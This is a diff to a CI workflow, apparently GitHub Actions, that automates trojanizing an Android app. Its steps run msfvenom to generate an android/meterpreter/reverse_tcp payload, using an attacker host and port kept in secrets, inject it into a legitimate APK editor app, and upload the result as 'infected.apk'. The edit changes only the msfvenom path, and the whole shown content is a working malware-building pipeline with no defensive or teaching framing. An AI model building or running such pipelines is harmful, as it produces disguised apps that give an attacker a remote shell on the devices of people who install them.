@@ -24,8 +24,8 @@ jobs:
 
     - name: Inject Metasploit payload into APK
       run: |
-        msfvenom -p android/meterpreter/reverse_tcp LHOST=${{ secrets.LHOST }} LPORT=${{ secrets.LPORT }} -o /tmp/metasploit.apk
-        msfvenom -x apk-source/apk-editor-1-9-0.apk -k -p android/meterpreter/reverse_tcp LHOST=${{ secrets.LHOST }} LPORT=${{ secrets.LPORT }} -o apk-infected/infected.apk
+        /usr/bin/msfvenom -p android/meterpreter/reverse_tcp LHOST=${{ secrets.LHOST }} LPORT=${{ secrets.LPORT }} -o /tmp/metasploit.apk
+        /usr/bin/msfvenom -x apk-source/apk-editor-1-9-0.apk -k -p android/meterpreter/reverse_tcp LHOST=${{ secrets.LHOST }} LPORT=${{ secrets.LPORT }} -o apk-infected/infected.apk
 
     - name: Upload infected APK
       uses: actions/upload-artifact@v3
